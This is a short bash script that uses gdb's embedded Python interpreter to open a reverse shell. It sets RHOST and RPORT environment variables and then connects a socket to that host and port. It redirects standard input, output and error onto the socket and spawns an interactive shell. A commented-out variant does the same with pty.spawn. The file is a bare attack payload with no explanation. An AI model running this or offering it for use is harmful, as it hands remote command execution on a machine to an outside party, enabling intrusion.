#!/bin/bash

export RHOST=0.0.0.0
export RPORT=5253
#echo "c" | gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
#s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
#[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
#pty.spawn("/bin/sh")' -ex quit

echo "c" | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$RHOST",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$SHELL","-i"]);' -ex quit